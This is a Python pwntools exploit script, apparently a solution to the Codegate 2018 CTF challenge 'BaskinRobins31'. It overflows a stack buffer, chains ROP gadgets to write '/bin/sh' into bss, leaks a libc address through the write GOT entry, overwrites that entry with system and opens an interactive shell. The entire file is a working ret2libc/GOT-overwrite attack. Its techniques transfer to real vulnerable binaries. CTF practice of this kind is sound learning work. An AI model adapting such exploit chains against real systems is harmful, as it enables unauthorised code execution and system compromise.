from pwn import *

print("------------------")
print("---Codegate2018---")
print("-pwned by pwnWiz--")
print("------------------")
print("\n")

context.log_level='debug'
#r=remote("ch41l3ng3s.codegate.kr","3131")
r=process('./BaskinRobins31')
e=ELF('./BaskinRobins31')

log.info("BaskinRobins31 Loaded..")

#plt_read=0x400700
#got_read=0x602040
#plt_write=0x4006d0
plt_read=e.plt['read']
plt_write=e.plt['write']
got_read=e.got['read']
got_write=e.got['write']

pppr = 0x40087a
addr_bss = 0x602090

# Buffer + SFP
payload="A"*160  # buffer  9/8=176 lose
payload+="B"*12
payload+="C"*4
payload+="D"*8

# write /bin/sh to bss
payload+=p64(pppr)
payload+=p64(0)
payload+=p64(addr_bss)
payload+=p64(len("/bin/sh\0"))
payload+=p64(plt_read)

# read addr of write
payload+=p64(pppr)
payload+=p64(1)
payload+=p64(got_write)
payload+=p64(8)
payload+=p64(plt_write)

# got overwrite
payload+=p64(pppr)
payload+=p64(0)
payload+=p64(got_write)
payload+=p64(8)
payload+=p64(plt_read)

# call libc
payload+=p64(0x400bc3)
payload+=p64(addr_bss)
payload+=p64(plt_write)
payload+="AAAAAAAA"

r.recv()

r.send(payload)
r.sendline("/bin/sh")
r.recvuntil("Don't break the rules...:( \n")
leak_libc=u64(r.recv(6)+"\x00\x00")
print 'leak_libc : ' + str(hex(leak_libc))

offset=0xb1f20
system_addr = leak_libc-offset
print 'system_addr : ' + str(hex(system_addr))
r.sendline(p64(system_addr))

r.interactive()
